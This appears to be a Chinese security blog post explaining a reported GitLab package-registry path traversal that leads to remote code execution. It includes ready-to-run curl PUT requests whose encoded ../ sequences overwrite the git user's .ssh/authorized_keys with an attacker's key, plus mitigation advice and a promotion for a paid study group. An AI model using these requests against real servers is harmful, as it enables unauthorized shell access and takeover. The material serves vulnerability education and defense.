#  通过路径遍历所实现的RCE   
原创 Richardo1o1  迪哥讲事   2024-05-23 23:00  
  
## 漏洞原理  
  
路径遍历：这种类型的安全漏洞允许攻击者访问应用程序本不打算公开的文件和目录。通过构造特殊的输入，如使用../（向上遍历目录）的序列，攻击者可以逃离受限的目录，访问文件系统上的其他位置。  
  
利用GitLab包注册API：攻击者通过向GitLab的包注册API发送特殊构造的请求，利用路径遍历漏洞，将恶意文件（如SSH公钥）写入到一个敏感文件（如.ssh/authorized_keys）中。  
## 攻击过程  
  
启用包注册功能：确保GitLab实例中启用了包注册功能。  
  
创建项目：在启用了包注册的GitLab实例中创建一个新项目。  
  
生成私人令牌：为了通过API调用GitLab，创建一个私人令牌。  
  
发送恶意请求：使用curl发送一个PUT请求，该请求包含了一个经过精心构造的路径，利用路径遍历漏洞来覆盖或创建.ssh/authorized_keys文件，将攻击者的SSH公钥添加进去。  
## 示例请求：  
  
curl -H "Private-Token: $(cat token)" http://10.26.0.5/api/v4/projects/2/packages/maven/a%2fb%2fc%2fd%2fe%2ff%2fg%2fh%2fi%2f1/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f.ssh%2fauthorized_keys -XPUT --path-as-is --data-binary @/home/asakawa/.ssh/id_rsa.pub  
  
在这个请求中，%2e%2e是URL编码的..，代表路径中的“上一级目录”。  
  
获取Shell访问：在.ssh/authorized_keys文件被成功写入攻击者的SSH公钥后，攻击者就可以使用SSH以git用户的身份登录GitLab服务器，并执行任意命令。  
## 漏洞的危害  
  
这个漏洞允许未经授权的攻击者远程写入文件到GitLab服务器上的任意位置，这可能导致多种安全问题，包括但不限于：  
  
未经授权的服务器访问。  
  
以服务器用户身份执行任意代码。  
  
进一步的权限提升攻击。  
## 防御措施  
  
立即升级到最新版本的GitLab，以确保包含了对该漏洞的修复。  
  
定期检查并限制对敏感文件（如.ssh/authorized_keys）的写入权限，确保仅受信任的进程和用户有权修改。  
  
在可能的情况下，限制外部API的访问，仅允许受信任的用户和系统调用这些接口。  
  
定期审计和监控重要文件的变化，以便快速检测到未经授权的修改行为。  
## 正常情况下的请求  
  
在没有安全漏洞利用的情况下，一个正常的API请求到GitLab的包注册功能可能是为了上传或下载包文件，而不会试图访问或修改系统文件。例如，一个正常的上传Maven包的请求可能看起来像这样：  
```
curl -H "Private-Token: <your_token>" -XPUT http://gitlab.example.com/api/v4/projects/2/packages/maven/com/example/myapp/1.0/myapp-1.0.jar --data-binary @/path/to/myapp-1.0.jar


```  
  
这个请求是将一个名为myapp-1.0.jar的文件上传到GitLab实例中项目ID为2的Maven仓库中。这里没有尝试越过授权路径或者修改敏感文件。  
## 受到攻击之后的请求  
  
受到攻击时，请求会包含恶意构造的路径，尝试利用路径遍历漏洞覆盖或修改敏感文件。攻击者可能会发送如下请求：  
```
curl -H "Private-Token: <your_token>" http://gitlab.example.com/api/v4/projects/2/packages/maven/a%2fb%2fc%2fd%2fe%2ff%2fg%2fh%2fi%2f1/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f.ssh%2fauthorized_keys -XPUT --path-as-is --data-binary @/home/attacker/.ssh/id_rsa.pub
#其实就是:
curl -H "Private-Token: <your_token>" http://gitlab.example.com/api/v4//projects/2/packages/maven/a/b/c/d/e/f/g/h/i/1/../../../../../../../../../../.ssh/authorized_keys -XPUT --path-as-is --data-binary @/home/attacker/.ssh/id_rsa.pub


```  
  
在这个请求中，攻击者利用了路径遍历（%2e%2e是..的URL编码，表示上一级目录）来尝试将自己的SSH公钥添加到GitLab服务器上git用户的.ssh/authorized_keys文件中。如果成功，这将允许攻击者通过SSH以git用户身份登录到服务器，并可能执行进一步的恶意操作。  
## 整个流程  
### 环节 1：准备阶段  
  
启用GitLab包注册功能：攻击者首先确认目标GitLab实例启用了包注册功能，这是他们利用这个漏洞的前提条件。 创建项目：攻击者在GitLab实例中创建一个项目，或者找到一个已经存在的项目，该项目启用了包注册功能。 获取API访问令牌：攻击者需要一个API访问令牌来进行API调用。这可以通过创建一个私有访问令牌来实现，这通常是通过GitLab的用户界面完成的。  
### 环节 2：构造恶意请求  
  
构造路径遍历请求：攻击者构造一个恶意的API请求，该请求利用路径遍历漏洞。这通过在请求路径中包含多个../序列来实现，目的是跨越目录边界，访问GitLab服务器上的任意文件系统位置。 目标文件选择：攻击者选择一个目标文件，例如.ssh/authorized_keys，以便能够在成功利用漏洞后通过SSH访问服务器。 发送请求：使用构造好的路径和目标文件，攻击者发送一个PUT请求，试图将自己的SSH公钥写入到目标GitLab服务器的.ssh/authorized_keys文件中。  
### 环节 3：利用漏洞  
  
请求处理：GitLab服务器接收到请求，并开始处理。由于存在路径遍历漏洞，服务器没有正确地限制请求路径的范围，导致请求跳出了预定的路径。 写入文件：恶意请求成功绕过了路径限制，将攻击者的SSH公钥写入了.ssh/authorized_keys文件。  
### 环节 4：获取访问权限  
  
SSH访问：攻击者现在可以使用其SSH私钥通过SSH作为git用户登录到GitLab服务器，因为其公钥已被添加到authorized_keys文件中。 执行命令：一旦获得对GitLab服务器的SSH访问权限，攻击者可以执行任意命令，从而完全控制服务器。  
  
如果你是一个长期主义者，欢迎加入我的知识星球，我们一起往前走，每日都会更新，精细化运营，微信识别二维码付费即可加入，如不满意，72 小时内可在 App 内无条件自助退款前面有同学问我有没优惠券，这里发放100张100元的优惠券,用完今年不再发放  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj7N5nMaJbtnMPVw96ZcVbWfp6SGDicUaGZyrWOM67xP8Ot3ftyqOybMqbj1005WvMNbDJO0hOWkCaQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj5jYW8icFkojHqg2WTWTjAnvcuF7qGrj3JLz1VgSFDDMOx0DbKjsia5ibMpeISsibYJ0ib1d2glMk2hySA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
## 往期回顾  
  
  
[](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486912&idx=1&sn=8704ce12dedf32923c6af49f1b139470&chksm=e8a607a3dfd18eb5abc302a40da024dbd6ada779267e31c20a0fe7bbc75a5947f19ba43db9c7&scene=21#wechat_redirect)  
  
[dom-xss精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247488819&idx=1&sn=5141f88f3e70b9c97e63a4b68689bf6e&chksm=e8a61f50dfd1964692f93412f122087ac160b743b4532ee0c1e42a83039de62825ebbd066a1e&scene=21#wechat_redirect)  
  
  
[年度精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487187&idx=1&sn=622438ee6492e4c639ebd8500384ab2f&chksm=e8a604b0dfd18da6c459b4705abd520cc2259a607dd9306915d845c1965224cc117207fc6236&scene=21#wechat_redirect)  
[](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487187&idx=1&sn=622438ee6492e4c639ebd8500384ab2f&chksm=e8a604b0dfd18da6c459b4705abd520cc2259a607dd9306915d845c1965224cc117207fc6236&scene=21#wechat_redirect)  
  
  
[Nuclei权威指南-如何躺赚](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487122&idx=1&sn=32459310408d126aa43240673b8b0846&chksm=e8a604f1dfd18de737769dd512ad4063a3da328117b8a98c4ca9bc5b48af4dcfa397c667f4e3&scene=21#wechat_redirect)  
  
  
[漏洞赏金猎人系列-如何测试设置功能IV](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486973&idx=1&sn=6ec419db11ff93d30aa2fbc04d8dbab6&chksm=e8a6079edfd18e88f6236e237837ee0d1101489d52f2abb28532162e2937ec4612f1be52a88f&scene=21#wechat_redirect)  
  
  
[漏洞赏金猎人系列-如何测试注册功能以及相关Tips](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486764&idx=1&sn=9f78d4c937675d76fb94de20effdeb78&chksm=e8a6074fdfd18e59126990bc3fcae300cdac492b374ad3962926092aa0074c3ee0945a31aa8a&scene=21#wechat_redirect)  
  
## 参考  
  
https://hackerone.com/reports/733072  
  
